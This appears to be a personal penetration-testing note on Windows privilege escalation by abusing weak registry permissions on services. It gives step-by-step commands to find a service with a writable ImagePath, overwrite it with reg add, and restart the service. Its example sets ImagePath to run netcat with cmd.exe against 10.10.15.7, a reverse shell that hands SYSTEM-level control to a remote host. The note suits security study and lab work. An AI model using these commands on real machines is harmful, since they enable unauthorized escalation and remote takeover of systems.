# Weak Permissions - Services 
##### Introduction 
We can search for a service that allows us to edit values like its ImagePath registry entry. We can point this to an executable to run. 

##### ImagePath
1. Check the target service can run as *SYSTEM* or *Administrator*

	```
	sc qc SERVICE_NAME
	```

3. We can search the target service for the necessary permissions. The registry entries should be writeable by *"NT AUTHORITY\INTERACTIVE"* or similar.

	```
	accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\SERVICE_NAME
	```

```
	get-acl HKLM:\System\CurrentControlSet\services\RSOPProv | fl
```

If the user has SetValue, CreateSubKey, Delete and ReadKey, we can replace the service.

4. Set the ImagePath to an executable we want to run when the service starts.

	```
	reg add HKLM\SYSTEM\CurrentControlSet\services\SERVICE_NAME /v ImagePath /t REG_EXPAND_SZ /d MALICIOUS.EXE /f
	```

*Example*
```
REG add HKLM\System\CurrentControlSet\Services\RSoPProv /v ImagePath /t REG_EXPAND_SZ /d “C:\Users\jorden\Documents\nc.exe 10.10.15.7 9001 -e cmd.exe” /f
```

5. Start the service 

[CMD.exe](obsidian://open?vault=Security%20%26%20PenTesting&file=Utils%2FWindows%2FCMD)
[PowerShell](obsidian://open?vault=Security%20%26%20PenTesting&file=Utils%2FWindows%2FPowerShell)

